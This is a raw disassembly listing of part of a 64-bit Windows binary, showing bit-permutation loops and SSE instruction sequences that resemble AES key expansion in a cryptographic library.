   140002d1b:	49 c1 ea 08          	shr    $0x8,%r10
   140002d1f:	4d 31 ca             	xor    %r9,%r10
   140002d22:	4d 21 c2             	and    %r8,%r10
   140002d25:	4d 89 d3             	mov    %r10,%r11
   140002d28:	49 c1 e3 08          	shl    $0x8,%r11
   140002d2c:	4d 09 d3             	or     %r10,%r11
   140002d2f:	4d 31 cb             	xor    %r9,%r11
   140002d32:	4d 89 d9             	mov    %r11,%r9
   140002d35:	49 c1 e9 04          	shr    $0x4,%r9
   140002d39:	4d 31 d9             	xor    %r11,%r9
   140002d3c:	49 21 c1             	and    %rax,%r9
   140002d3f:	4d 89 ca             	mov    %r9,%r10
   140002d42:	49 c1 e2 04          	shl    $0x4,%r10
   140002d46:	4d 09 ca             	or     %r9,%r10
   140002d49:	4d 31 da             	xor    %r11,%r10
   140002d4c:	4c 89 94 15 18 08 00 	mov    %r10,0x818(%rbp,%rdx,1)
   140002d53:	00 
   140002d54:	4c 8b 8c 15 20 08 00 	mov    0x820(%rbp,%rdx,1),%r9
   140002d5b:	00 
   140002d5c:	4d 89 ca             	mov    %r9,%r10
   140002d5f:	49 c1 ea 08          	shr    $0x8,%r10
   140002d63:	4d 31 ca             	xor    %r9,%r10
   140002d66:	4d 21 c2             	and    %r8,%r10
   140002d69:	4d 89 d3             	mov    %r10,%r11
   140002d6c:	49 c1 e3 08          	shl    $0x8,%r11
   140002d70:	4d 09 d3             	or     %r10,%r11
   140002d73:	4d 31 cb             	xor    %r9,%r11
   140002d76:	4d 89 d9             	mov    %r11,%r9
   140002d79:	49 c1 e9 04          	shr    $0x4,%r9
   140002d7d:	4d 31 d9             	xor    %r11,%r9
   140002d80:	49 21 c1             	and    %rax,%r9
   140002d83:	4d 89 ca             	mov    %r9,%r10
   140002d86:	49 c1 e2 04          	shl    $0x4,%r10
   140002d8a:	4d 09 ca             	or     %r9,%r10
   140002d8d:	4d 31 da             	xor    %r11,%r10
   140002d90:	4c 89 94 15 20 08 00 	mov    %r10,0x820(%rbp,%rdx,1)
   140002d97:	00 
   140002d98:	4c 8b 8c 15 28 08 00 	mov    0x828(%rbp,%rdx,1),%r9
   140002d9f:	00 
   140002da0:	4d 89 ca             	mov    %r9,%r10
   140002da3:	49 c1 ea 08          	shr    $0x8,%r10
   140002da7:	4d 31 ca             	xor    %r9,%r10
   140002daa:	4d 21 c2             	and    %r8,%r10
   140002dad:	4d 89 d3             	mov    %r10,%r11
   140002db0:	49 c1 e3 08          	shl    $0x8,%r11
   140002db4:	4d 09 d3             	or     %r10,%r11
   140002db7:	4d 31 cb             	xor    %r9,%r11
   140002dba:	4d 89 d9             	mov    %r11,%r9
   140002dbd:	49 c1 e9 04          	shr    $0x4,%r9
   140002dc1:	4d 31 d9             	xor    %r11,%r9
   140002dc4:	49 21 c1             	and    %rax,%r9
   140002dc7:	4d 89 ca             	mov    %r9,%r10
   140002dca:	49 c1 e2 04          	shl    $0x4,%r10
   140002dce:	4d 09 ca             	or     %r9,%r10
   140002dd1:	4d 31 da             	xor    %r11,%r10
   140002dd4:	4c 89 94 15 28 08 00 	mov    %r10,0x828(%rbp,%rdx,1)
   140002ddb:	00 
   140002ddc:	4c 8b 8c 15 30 08 00 	mov    0x830(%rbp,%rdx,1),%r9
   140002de3:	00 
   140002de4:	4d 89 ca             	mov    %r9,%r10
   140002de7:	49 c1 ea 08          	shr    $0x8,%r10
   140002deb:	4d 31 ca             	xor    %r9,%r10
   140002dee:	4d 21 c2             	and    %r8,%r10
   140002df1:	4d 89 d3             	mov    %r10,%r11
   140002df4:	49 c1 e3 08          	shl    $0x8,%r11
   140002df8:	4d 09 d3             	or     %r10,%r11
   140002dfb:	4d 31 cb             	xor    %r9,%r11
   140002dfe:	4d 89 d9             	mov    %r11,%r9
   140002e01:	49 c1 e9 04          	shr    $0x4,%r9
   140002e05:	4d 31 d9             	xor    %r11,%r9
   140002e08:	49 21 c1             	and    %rax,%r9
   140002e0b:	4d 89 ca             	mov    %r9,%r10
   140002e0e:	49 c1 e2 04          	shl    $0x4,%r10
   140002e12:	4d 09 ca             	or     %r9,%r10
   140002e15:	4d 31 da             	xor    %r11,%r10
   140002e18:	4c 89 94 15 30 08 00 	mov    %r10,0x830(%rbp,%rdx,1)
   140002e1f:	00 
   140002e20:	4c 8b 8c 15 38 08 00 	mov    0x838(%rbp,%rdx,1),%r9
   140002e27:	00 
   140002e28:	4d 89 ca             	mov    %r9,%r10
   140002e2b:	49 c1 ea 08          	shr    $0x8,%r10
   140002e2f:	4d 31 ca             	xor    %r9,%r10
   140002e32:	4d 21 c2             	and    %r8,%r10
   140002e35:	4d 89 d3             	mov    %r10,%r11
   140002e38:	49 c1 e3 08          	shl    $0x8,%r11
   140002e3c:	4d 09 d3             	or     %r10,%r11
   140002e3f:	4d 31 cb             	xor    %r9,%r11
   140002e42:	4d 89 d9             	mov    %r11,%r9
   140002e45:	49 c1 e9 04          	shr    $0x4,%r9
   140002e49:	4d 31 d9             	xor    %r11,%r9
   140002e4c:	49 21 c1             	and    %rax,%r9
   140002e4f:	4d 89 ca             	mov    %r9,%r10
   140002e52:	49 c1 e2 04          	shl    $0x4,%r10
   140002e56:	4d 09 ca             	or     %r9,%r10
   140002e59:	4d 31 da             	xor    %r11,%r10
   140002e5c:	4c 89 94 15 38 08 00 	mov    %r10,0x838(%rbp,%rdx,1)
   140002e63:	00 
   140002e64:	4c 8b 8c 15 40 08 00 	mov    0x840(%rbp,%rdx,1),%r9
   140002e6b:	00 
   140002e6c:	4d 89 ca             	mov    %r9,%r10
   140002e6f:	49 c1 ea 08          	shr    $0x8,%r10
   140002e73:	4d 31 ca             	xor    %r9,%r10
   140002e76:	4d 21 c2             	and    %r8,%r10
   140002e79:	4d 89 d3             	mov    %r10,%r11
   140002e7c:	49 c1 e3 08          	shl    $0x8,%r11
   140002e80:	4d 09 d3             	or     %r10,%r11
   140002e83:	4d 31 cb             	xor    %r9,%r11
   140002e86:	4d 89 d9             	mov    %r11,%r9
   140002e89:	49 c1 e9 04          	shr    $0x4,%r9
   140002e8d:	4d 31 d9             	xor    %r11,%r9
   140002e90:	49 21 c1             	and    %rax,%r9
   140002e93:	4d 89 ca             	mov    %r9,%r10
   140002e96:	49 c1 e2 04          	shl    $0x4,%r10
   140002e9a:	4d 09 ca             	or     %r9,%r10
   140002e9d:	4d 31 da             	xor    %r11,%r10
   140002ea0:	4c 89 94 15 40 08 00 	mov    %r10,0x840(%rbp,%rdx,1)
   140002ea7:	00 
   140002ea8:	4c 8b 8c 15 48 08 00 	mov    0x848(%rbp,%rdx,1),%r9
   140002eaf:	00 
   140002eb0:	4d 89 ca             	mov    %r9,%r10
   140002eb3:	49 c1 ea 08          	shr    $0x8,%r10
   140002eb7:	4d 31 ca             	xor    %r9,%r10
   140002eba:	4d 21 c2             	and    %r8,%r10
   140002ebd:	4d 89 d3             	mov    %r10,%r11
   140002ec0:	49 c1 e3 08          	shl    $0x8,%r11
   140002ec4:	4d 09 d3             	or     %r10,%r11
   140002ec7:	4d 31 cb             	xor    %r9,%r11
   140002eca:	4d 89 d9             	mov    %r11,%r9
   140002ecd:	49 c1 e9 04          	shr    $0x4,%r9
   140002ed1:	4d 31 d9             	xor    %r11,%r9
   140002ed4:	49 21 c1             	and    %rax,%r9
   140002ed7:	4d 89 ca             	mov    %r9,%r10
   140002eda:	49 c1 e2 04          	shl    $0x4,%r10
   140002ede:	4d 09 ca             	or     %r9,%r10
   140002ee1:	4d 31 da             	xor    %r11,%r10
   140002ee4:	4c 89 94 15 48 08 00 	mov    %r10,0x848(%rbp,%rdx,1)
   140002eeb:	00 
   140002eec:	4c 8b 8c 15 50 08 00 	mov    0x850(%rbp,%rdx,1),%r9
   140002ef3:	00 
   140002ef4:	4d 89 ca             	mov    %r9,%r10
   140002ef7:	49 c1 ea 08          	shr    $0x8,%r10
   140002efb:	4d 31 ca             	xor    %r9,%r10
   140002efe:	4d 21 c2             	and    %r8,%r10
   140002f01:	4d 89 d3             	mov    %r10,%r11
   140002f04:	49 c1 e3 08          	shl    $0x8,%r11
   140002f08:	4d 09 d3             	or     %r10,%r11
   140002f0b:	4d 31 cb             	xor    %r9,%r11
   140002f0e:	4d 89 d9             	mov    %r11,%r9
   140002f11:	49 c1 e9 04          	shr    $0x4,%r9
   140002f15:	4d 31 d9             	xor    %r11,%r9
   140002f18:	49 21 c1             	and    %rax,%r9
   140002f1b:	4d 89 ca             	mov    %r9,%r10
   140002f1e:	49 c1 e2 04          	shl    $0x4,%r10
   140002f22:	4d 09 ca             	or     %r9,%r10
   140002f25:	4d 31 da             	xor    %r11,%r10
   140002f28:	4c 89 94 15 50 08 00 	mov    %r10,0x850(%rbp,%rdx,1)
   140002f2f:	00 
   140002f30:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   140002f37:	48 81 fa f8 03 00 00 	cmp    $0x3f8,%rdx
   140002f3e:	0f 85 5c fa ff ff    	jne    0x1400029a0
   140002f44:	4c 8b 85 90 0b 00 00 	mov    0xb90(%rbp),%r8
   140002f4b:	48 8b 95 98 0b 00 00 	mov    0xb98(%rbp),%rdx
   140002f52:	4d 89 c1             	mov    %r8,%r9
   140002f55:	49 c1 e9 08          	shr    $0x8,%r9
   140002f59:	4d 31 c1             	xor    %r8,%r9
   140002f5c:	49 21 c9             	and    %rcx,%r9
   140002f5f:	4d 89 ca             	mov    %r9,%r10
   140002f62:	49 c1 e2 08          	shl    $0x8,%r10
   140002f66:	4d 09 ca             	or     %r9,%r10
   140002f69:	4d 31 c2             	xor    %r8,%r10
   140002f6c:	4d 89 d0             	mov    %r10,%r8
   140002f6f:	49 c1 e8 04          	shr    $0x4,%r8
   140002f73:	4d 31 d0             	xor    %r10,%r8
   140002f76:	49 21 c0             	and    %rax,%r8
   140002f79:	4d 89 c1             	mov    %r8,%r9
   140002f7c:	49 c1 e1 04          	shl    $0x4,%r9
   140002f80:	4d 09 c1             	or     %r8,%r9
   140002f83:	4d 31 d1             	xor    %r10,%r9
   140002f86:	4c 89 8d 90 0b 00 00 	mov    %r9,0xb90(%rbp)
   140002f8d:	49 89 d0             	mov    %rdx,%r8
   140002f90:	49 c1 e8 08          	shr    $0x8,%r8
   140002f94:	49 31 d0             	xor    %rdx,%r8
   140002f97:	49 21 c8             	and    %rcx,%r8
   140002f9a:	4d 89 c1             	mov    %r8,%r9
   140002f9d:	49 c1 e1 08          	shl    $0x8,%r9
   140002fa1:	4d 09 c1             	or     %r8,%r9
   140002fa4:	49 31 d1             	xor    %rdx,%r9
   140002fa7:	4c 89 ca             	mov    %r9,%rdx
   140002faa:	48 c1 ea 04          	shr    $0x4,%rdx
   140002fae:	4c 31 ca             	xor    %r9,%rdx
   140002fb1:	48 21 c2             	and    %rax,%rdx
   140002fb4:	49 89 d0             	mov    %rdx,%r8
   140002fb7:	49 c1 e0 04          	shl    $0x4,%r8
   140002fbb:	49 09 d0             	or     %rdx,%r8
   140002fbe:	4d 31 c8             	xor    %r9,%r8
   140002fc1:	4c 89 85 98 0b 00 00 	mov    %r8,0xb98(%rbp)
   140002fc8:	48 8b 95 a0 0b 00 00 	mov    0xba0(%rbp),%rdx
   140002fcf:	49 89 d0             	mov    %rdx,%r8
   140002fd2:	49 c1 e8 08          	shr    $0x8,%r8
   140002fd6:	49 31 d0             	xor    %rdx,%r8
   140002fd9:	49 21 c8             	and    %rcx,%r8
   140002fdc:	4d 89 c1             	mov    %r8,%r9
   140002fdf:	49 c1 e1 08          	shl    $0x8,%r9
   140002fe3:	4d 09 c1             	or     %r8,%r9
   140002fe6:	49 31 d1             	xor    %rdx,%r9
   140002fe9:	4c 89 ca             	mov    %r9,%rdx
   140002fec:	48 c1 ea 04          	shr    $0x4,%rdx
   140002ff0:	4c 31 ca             	xor    %r9,%rdx
   140002ff3:	48 21 c2             	and    %rax,%rdx
   140002ff6:	49 89 d0             	mov    %rdx,%r8
   140002ff9:	49 c1 e0 04          	shl    $0x4,%r8
   140002ffd:	49 09 d0             	or     %rdx,%r8
   140003000:	4d 31 c8             	xor    %r9,%r8
   140003003:	4c 89 85 a0 0b 00 00 	mov    %r8,0xba0(%rbp)
   14000300a:	48 8b 95 a8 0b 00 00 	mov    0xba8(%rbp),%rdx
   140003011:	49 89 d0             	mov    %rdx,%r8
   140003014:	49 c1 e8 08          	shr    $0x8,%r8
   140003018:	49 31 d0             	xor    %rdx,%r8
   14000301b:	49 21 c8             	and    %rcx,%r8
   14000301e:	4d 89 c1             	mov    %r8,%r9
   140003021:	49 c1 e1 08          	shl    $0x8,%r9
   140003025:	4d 09 c1             	or     %r8,%r9
   140003028:	49 31 d1             	xor    %rdx,%r9
   14000302b:	4c 89 ca             	mov    %r9,%rdx
   14000302e:	48 c1 ea 04          	shr    $0x4,%rdx
   140003032:	4c 31 ca             	xor    %r9,%rdx
   140003035:	48 21 c2             	and    %rax,%rdx
   140003038:	49 89 d0             	mov    %rdx,%r8
   14000303b:	49 c1 e0 04          	shl    $0x4,%r8
   14000303f:	49 09 d0             	or     %rdx,%r8
   140003042:	4d 31 c8             	xor    %r9,%r8
   140003045:	4c 89 85 a8 0b 00 00 	mov    %r8,0xba8(%rbp)
   14000304c:	48 8b 95 b0 0b 00 00 	mov    0xbb0(%rbp),%rdx
   140003053:	49 89 d0             	mov    %rdx,%r8
   140003056:	49 c1 e8 08          	shr    $0x8,%r8
   14000305a:	49 31 d0             	xor    %rdx,%r8
   14000305d:	49 21 c8             	and    %rcx,%r8
   140003060:	4d 89 c1             	mov    %r8,%r9
   140003063:	49 c1 e1 08          	shl    $0x8,%r9
   140003067:	4d 09 c1             	or     %r8,%r9
   14000306a:	49 31 d1             	xor    %rdx,%r9
   14000306d:	4c 89 ca             	mov    %r9,%rdx
   140003070:	48 c1 ea 04          	shr    $0x4,%rdx
   140003074:	4c 31 ca             	xor    %r9,%rdx
   140003077:	48 21 c2             	and    %rax,%rdx
   14000307a:	49 89 d0             	mov    %rdx,%r8
   14000307d:	49 c1 e0 04          	shl    $0x4,%r8
   140003081:	49 09 d0             	or     %rdx,%r8
   140003084:	4d 31 c8             	xor    %r9,%r8
   140003087:	4c 89 85 b0 0b 00 00 	mov    %r8,0xbb0(%rbp)
   14000308e:	48 8b 95 b8 0b 00 00 	mov    0xbb8(%rbp),%rdx
   140003095:	49 89 d0             	mov    %rdx,%r8
   140003098:	49 c1 e8 08          	shr    $0x8,%r8
   14000309c:	49 31 d0             	xor    %rdx,%r8
   14000309f:	49 21 c8             	and    %rcx,%r8
   1400030a2:	4d 89 c1             	mov    %r8,%r9
   1400030a5:	49 c1 e1 08          	shl    $0x8,%r9
   1400030a9:	4d 09 c1             	or     %r8,%r9
   1400030ac:	49 31 d1             	xor    %rdx,%r9
   1400030af:	4c 89 ca             	mov    %r9,%rdx
   1400030b2:	48 c1 ea 04          	shr    $0x4,%rdx
   1400030b6:	4c 31 ca             	xor    %r9,%rdx
   1400030b9:	48 21 c2             	and    %rax,%rdx
   1400030bc:	49 89 d0             	mov    %rdx,%r8
   1400030bf:	49 c1 e0 04          	shl    $0x4,%r8
   1400030c3:	49 09 d0             	or     %rdx,%r8
   1400030c6:	4d 31 c8             	xor    %r9,%r8
   1400030c9:	4c 89 85 b8 0b 00 00 	mov    %r8,0xbb8(%rbp)
   1400030d0:	48 8b 95 c0 0b 00 00 	mov    0xbc0(%rbp),%rdx
   1400030d7:	49 89 d0             	mov    %rdx,%r8
   1400030da:	49 c1 e8 08          	shr    $0x8,%r8
   1400030de:	49 31 d0             	xor    %rdx,%r8
   1400030e1:	49 21 c8             	and    %rcx,%r8
   1400030e4:	4d 89 c1             	mov    %r8,%r9
   1400030e7:	49 c1 e1 08          	shl    $0x8,%r9
   1400030eb:	4d 09 c1             	or     %r8,%r9
   1400030ee:	49 31 d1             	xor    %rdx,%r9
   1400030f1:	4c 89 ca             	mov    %r9,%rdx
   1400030f4:	48 c1 ea 04          	shr    $0x4,%rdx
   1400030f8:	4c 31 ca             	xor    %r9,%rdx
   1400030fb:	48 21 c2             	and    %rax,%rdx
   1400030fe:	49 89 d0             	mov    %rdx,%r8
   140003101:	49 c1 e0 04          	shl    $0x4,%r8
   140003105:	49 09 d0             	or     %rdx,%r8
   140003108:	4d 31 c8             	xor    %r9,%r8
   14000310b:	4c 89 85 c0 0b 00 00 	mov    %r8,0xbc0(%rbp)
   140003112:	48 8b 95 c8 0b 00 00 	mov    0xbc8(%rbp),%rdx
   140003119:	49 89 d0             	mov    %rdx,%r8
   14000311c:	49 c1 e8 08          	shr    $0x8,%r8
   140003120:	49 31 d0             	xor    %rdx,%r8
   140003123:	49 21 c8             	and    %rcx,%r8
   140003126:	4c 89 c1             	mov    %r8,%rcx
   140003129:	48 c1 e1 08          	shl    $0x8,%rcx
   14000312d:	4c 09 c1             	or     %r8,%rcx
   140003130:	48 31 d1             	xor    %rdx,%rcx
   140003133:	48 89 ca             	mov    %rcx,%rdx
   140003136:	48 c1 ea 04          	shr    $0x4,%rdx
   14000313a:	48 31 ca             	xor    %rcx,%rdx
   14000313d:	48 21 c2             	and    %rax,%rdx
   140003140:	48 89 d0             	mov    %rdx,%rax
   140003143:	48 c1 e0 04          	shl    $0x4,%rax
   140003147:	48 09 d0             	or     %rdx,%rax
   14000314a:	48 31 c8             	xor    %rcx,%rax
   14000314d:	48 89 85 c8 0b 00 00 	mov    %rax,0xbc8(%rbp)
   140003154:	b8 70 00 00 00       	mov    $0x70,%eax
   140003159:	4c 8b b5 18 0d 00 00 	mov    0xd18(%rbp),%r14
   140003160:	48 8b 9d c0 0c 00 00 	mov    0xcc0(%rbp),%rbx
   140003167:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000316e:	00 00 
   140003170:	48 f7 94 05 20 08 00 	notq   0x820(%rbp,%rax,1)
   140003177:	00 
   140003178:	48 f7 94 05 28 08 00 	notq   0x828(%rbp,%rax,1)
   14000317f:	00 
   140003180:	48 f7 94 05 48 08 00 	notq   0x848(%rbp,%rax,1)
   140003187:	00 
   140003188:	48 f7 94 05 50 08 00 	notq   0x850(%rbp,%rax,1)
   14000318f:	00 
   140003190:	48 83 c0 40          	add    $0x40,%rax
   140003194:	48 3d f0 03 00 00    	cmp    $0x3f0,%rax
   14000319a:	75 d4                	jne    0x140003170
   14000319c:	48 8d 8d d0 03 00 00 	lea    0x3d0(%rbp),%rcx
   1400031a3:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   1400031aa:	41 b8 c0 03 00 00    	mov    $0x3c0,%r8d
   1400031b0:	e8 5c ca 01 00       	call   0x14001fc11
   1400031b5:	e9 65 05 00 00       	jmp    0x14000371f
   1400031ba:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400031bf:	ba 29 00 00 00       	mov    $0x29,%edx
   1400031c4:	e8 74 cb 01 00       	call   0x14001fd3d
   1400031c9:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400031ce:	ba a3 02 00 00       	mov    $0x2a3,%edx
   1400031d3:	e8 65 cb 01 00       	call   0x14001fd3d
   1400031d8:	e8 33 cb 01 00       	call   0x14001fd10
   1400031dd:	84 c0                	test   %al,%al
   1400031df:	0f 84 56 f2 ff ff    	je     0x14000243b
   1400031e5:	66 0f 6f b5 30 0d 00 	movdqa 0xd30(%rbp),%xmm6
   1400031ec:	00 
   1400031ed:	66 0f 6f bd 40 0d 00 	movdqa 0xd40(%rbp),%xmm7
   1400031f4:	00 
   1400031f5:	66 0f 7f bd 50 08 00 	movdqa %xmm7,0x850(%rbp)
   1400031fc:	00 
   1400031fd:	48 8d 8d e0 07 00 00 	lea    0x7e0(%rbp),%rcx
   140003204:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   14000320b:	e8 90 67 00 00       	call   0x1400099a0
   140003210:	66 0f 70 85 e0 07 00 	pshufd $0xff,0x7e0(%rbp),%xmm0
   140003217:	00 ff 
   140003219:	66 0f 7f b5 c0 0d 00 	movdqa %xmm6,0xdc0(%rbp)
   140003220:	00 
   140003221:	66 0f 6f ce          	movdqa %xmm6,%xmm1
   140003225:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   14000322a:	66 0f 6f d6          	movdqa %xmm6,%xmm2
   14000322e:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   140003233:	66 0f ef d0          	pxor   %xmm0,%xmm2
   140003237:	66 0f 6f c6          	movdqa %xmm6,%xmm0
   14000323b:	66 0f 73 f8 0c       	pslldq $0xc,%xmm0
   140003240:	66 0f ef c1          	pxor   %xmm1,%xmm0
   140003244:	66 0f ef c2          	pxor   %xmm2,%xmm0
   140003248:	66 0f ef c6          	pxor   %xmm6,%xmm0
   14000324c:	66 0f 7f 85 50 08 00 	movdqa %xmm0,0x850(%rbp)
   140003253:	00 
   140003254:	66 0f 6f f0          	movdqa %xmm0,%xmm6
   140003258:	48 8d 8d d0 07 00 00 	lea    0x7d0(%rbp),%rcx
   14000325f:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   140003266:	e8 45 67 00 00       	call   0x1400099b0
   14000326b:	66 0f 70 85 d0 07 00 	pshufd $0xaa,0x7d0(%rbp),%xmm0
   140003272:	00 aa 
   140003274:	66 0f 7f bd 20 0d 00 	movdqa %xmm7,0xd20(%rbp)
   14000327b:	00 
   14000327c:	66 0f 6f cf          	movdqa %xmm7,%xmm1
   140003280:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   140003285:	66 0f 6f d7          	movdqa %xmm7,%xmm2
   140003289:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   14000328e:	66 0f ef d0          	pxor   %xmm0,%xmm2
   140003292:	66 0f 6f c7          	movdqa %xmm7,%xmm0
   140003296:	66 0f 73 f8 0c       	pslldq $0xc,%xmm0
   14000329b:	66 0f ef c1          	pxor   %xmm1,%xmm0
   14000329f:	66 0f ef c2          	pxor   %xmm2,%xmm0
   1400032a3:	66 0f ef c7          	pxor   %xmm7,%xmm0
   1400032a7:	66 0f 7f 85 50 08 00 	movdqa %xmm0,0x850(%rbp)
   1400032ae:	00 
   1400032af:	66 0f 6f f8          	movdqa %xmm0,%xmm7
   1400032b3:	48 8d 8d c0 07 00 00 	lea    0x7c0(%rbp),%rcx
   1400032ba:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   1400032c1:	e8 fa 66 00 00       	call   0x1400099c0
   1400032c6:	66 0f 70 85 c0 07 00 	pshufd $0xff,0x7c0(%rbp),%xmm0
   1400032cd:	00 ff 
   1400032cf:	66 0f 6f de          	movdqa %xmm6,%xmm3
   1400032d3:	66 0f 7f b5 d0 0d 00 	movdqa %xmm6,0xdd0(%rbp)
   1400032da:	00 
   1400032db:	66 0f 6f ce          	movdqa %xmm6,%xmm1
   1400032df:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   1400032e4:	66 0f 6f d6          	movdqa %xmm6,%xmm2
   1400032e8:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   1400032ed:	66 0f ef d0          	pxor   %xmm0,%xmm2
   1400032f1:	66 0f 73 fe 0c       	pslldq $0xc,%xmm6
   1400032f6:	66 0f ef f1          	pxor   %xmm1,%xmm6
   1400032fa:	66 0f ef f2          	pxor   %xmm2,%xmm6
   1400032fe:	66 0f ef f3          	pxor   %xmm3,%xmm6
   140003302:	66 0f 7f b5 50 08 00 	movdqa %xmm6,0x850(%rbp)
   140003309:	00 
   14000330a:	48 8d 8d b0 07 00 00 	lea    0x7b0(%rbp),%rcx
   140003311:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   140003318:	e8 93 66 00 00       	call   0x1400099b0
   14000331d:	66 0f 70 85 b0 07 00 	pshufd $0xaa,0x7b0(%rbp),%xmm0
   140003324:	00 aa 
   140003326:	66 0f 6f df          	movdqa %xmm7,%xmm3
   14000332a:	66 0f 7f bd d0 0c 00 	movdqa %xmm7,0xcd0(%rbp)
   140003331:	00 
   140003332:	66 0f 6f cf          	movdqa %xmm7,%xmm1
   140003336:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   14000333b:	66 0f 6f d7          	movdqa %xmm7,%xmm2
   14000333f:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   140003344:	66 0f ef d0          	pxor   %xmm0,%xmm2
   140003348:	66 0f 73 ff 0c       	pslldq $0xc,%xmm7
   14000334d:	66 0f ef f9          	pxor   %xmm1,%xmm7
   140003351:	66 0f ef fa          	pxor   %xmm2,%xmm7
   140003355:	66 0f ef fb          	pxor   %xmm3,%xmm7
   140003359:	66 0f 7f bd 50 08 00 	movdqa %xmm7,0x850(%rbp)
   140003360:	00 
   140003361:	48 8d 8d a0 07 00 00 	lea    0x7a0(%rbp),%rcx
   140003368:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   14000336f:	e8 5c 66 00 00       	call   0x1400099d0
   140003374:	66 0f 70 85 a0 07 00 	pshufd $0xff,0x7a0(%rbp),%xmm0
   14000337b:	00 ff 
   14000337d:	66 0f 6f ce          	movdqa %xmm6,%xmm1
   140003381:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   140003386:	66 0f 6f d6          	movdqa %xmm6,%xmm2
   14000338a:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   14000338f:	66 0f ef d0          	pxor   %xmm0,%xmm2
   140003393:	66 44 0f 6f c6       	movdqa %xmm6,%xmm8
   140003398:	66 41 0f 73 f8 0c    	pslldq $0xc,%xmm8
   14000339e:	66 44 0f ef c1       	pxor   %xmm1,%xmm8
   1400033a3:	66 44 0f ef c2       	pxor   %xmm2,%xmm8
   1400033a8:	66 44 0f ef c6       	pxor   %xmm6,%xmm8
   1400033ad:	66 44 0f 7f 85 50 08 	movdqa %xmm8,0x850(%rbp)
   1400033b4:	00 00 
   1400033b6:	48 8d 8d 90 07 00 00 	lea    0x790(%rbp),%rcx
   1400033bd:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   1400033c4:	e8 e7 65 00 00       	call   0x1400099b0
   1400033c9:	66 0f 70 85 90 07 00 	pshufd $0xaa,0x790(%rbp),%xmm0
   1400033d0:	00 aa 
   1400033d2:	66 0f 6f cf          	movdqa %xmm7,%xmm1
   1400033d6:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   1400033db:	66 0f 6f d7          	movdqa %xmm7,%xmm2
   1400033df:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   1400033e4:	66 0f ef d0          	pxor   %xmm0,%xmm2
   1400033e8:	66 44 0f 6f cf       	movdqa %xmm7,%xmm9
   1400033ed:	66 41 0f 73 f9 0c    	pslldq $0xc,%xmm9
   1400033f3:	66 44 0f ef c9       	pxor   %xmm1,%xmm9
   1400033f8:	66 44 0f ef ca       	pxor   %xmm2,%xmm9
   1400033fd:	66 44 0f ef cf       	pxor   %xmm7,%xmm9
   140003402:	66 44 0f 7f 8d 50 08 	movdqa %xmm9,0x850(%rbp)
   140003409:	00 00 
   14000340b:	48 8d 8d 40 08 00 00 	lea    0x840(%rbp),%rcx
   140003412:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   140003419:	e8 c2 65 00 00       	call   0x1400099e0
   14000341e:	66 0f 70 85 40 08 00 	pshufd $0xff,0x840(%rbp),%xmm0
   140003425:	00 ff 
   140003427:	66 41 0f 6f c8       	movdqa %xmm8,%xmm1
   14000342c:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   140003431:	66 41 0f 6f d0       	movdqa %xmm8,%xmm2
   140003436:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   14000343b:	66 0f ef d0          	pxor   %xmm0,%xmm2
   14000343f:	66 45 0f 6f d0       	movdqa %xmm8,%xmm10
   140003444:	66 41 0f 73 fa 0c    	pslldq $0xc,%xmm10
   14000344a:	66 44 0f ef d1       	pxor   %xmm1,%xmm10
   14000344f:	66 44 0f ef d2       	pxor   %xmm2,%xmm10
   140003454:	66 45 0f ef d0       	pxor   %xmm8,%xmm10
   140003459:	66 44 0f 7f 95 50 08 	movdqa %xmm10,0x850(%rbp)
   140003460:	00 00 
   140003462:	48 8d 8d 70 0c 00 00 	lea    0xc70(%rbp),%rcx
   140003469:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   140003470:	e8 3b 65 00 00       	call   0x1400099b0
   140003475:	66 0f 70 85 70 0c 00 	pshufd $0xaa,0xc70(%rbp),%xmm0
   14000347c:	00 aa 
   14000347e:	66 41 0f 6f c9       	movdqa %xmm9,%xmm1
   140003483:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   140003488:	66 41 0f 6f d1       	movdqa %xmm9,%xmm2
   14000348d:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   140003492:	66 0f ef d0          	pxor   %xmm0,%xmm2
   140003496:	66 45 0f 6f d9       	movdqa %xmm9,%xmm11
   14000349b:	66 41 0f 73 fb 0c    	pslldq $0xc,%xmm11
   1400034a1:	66 44 0f ef d9       	pxor   %xmm1,%xmm11
   1400034a6:	66 44 0f ef da       	pxor   %xmm2,%xmm11
   1400034ab:	66 45 0f ef d9       	pxor   %xmm9,%xmm11
   1400034b0:	66 44 0f 7f 9d 50 08 	movdqa %xmm11,0x850(%rbp)
   1400034b7:	00 00 
   1400034b9:	48 8d 8d 90 0c 00 00 	lea    0xc90(%rbp),%rcx
   1400034c0:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   1400034c7:	e8 24 65 00 00       	call   0x1400099f0
   1400034cc:	66 0f 70 85 90 0c 00 	pshufd $0xff,0xc90(%rbp),%xmm0
   1400034d3:	00 ff 
   1400034d5:	66 41 0f 6f ca       	movdqa %xmm10,%xmm1
   1400034da:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
